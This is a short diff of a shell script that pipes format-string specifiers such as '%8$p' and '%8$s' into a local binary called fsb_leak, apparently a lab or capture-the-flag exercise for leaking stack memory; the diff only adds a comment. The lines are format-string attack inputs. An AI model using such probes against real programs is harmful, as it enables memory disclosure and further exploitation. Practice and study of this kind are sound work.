@@ -13,5 +13,5 @@ echo '%6$p' | ./fsb_leak; echo
 echo '%7$p' | ./fsb_leak; echo
 echo '%8$p' | ./fsb_leak; echo
 
+# code 35-17
 echo '%8$s' | ./fsb_leak; echo
-
